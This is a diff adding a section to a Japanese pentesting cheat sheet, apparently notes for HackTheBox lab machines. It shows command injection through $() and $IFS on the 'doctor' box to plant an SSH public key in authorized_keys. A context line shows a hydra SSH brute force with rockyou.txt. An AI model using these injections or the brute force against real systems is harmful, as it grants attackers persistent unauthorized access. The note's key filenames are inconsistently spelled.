@@ -365,6 +365,21 @@ hydra -l kyle -P ~/rockyou.txt ssh://writer.htb -VV -f -t 60
 
 ```
 
+
+### 進入先に公開鍵を、RCEで作成する
+
+```
+ex: HackTheBox doctor
+
+ssh-keygen -t ed25519
+http://10.10.14.6/$(mkdir$IFS'/home/web/.ssh')
+id_ed255519.pubの中身をコピー
+http://10.10.14.6/$(echo$IFS'ssh-ed25519'$IFS'AAAAC3NzaC1lZDI1NTE5AAAAIOztJ2PDjV2sPrb96JZ1JVCS36aYTqzD/BR2T89y7QyB'>'/home/web/.ssh/authorized_keys')
+ssh -i ./id_ed255919 web@doctor.htb
+
+
+```
+
 ### SCP
 カレントディレクトリにsecret.zipをダウンロード
 
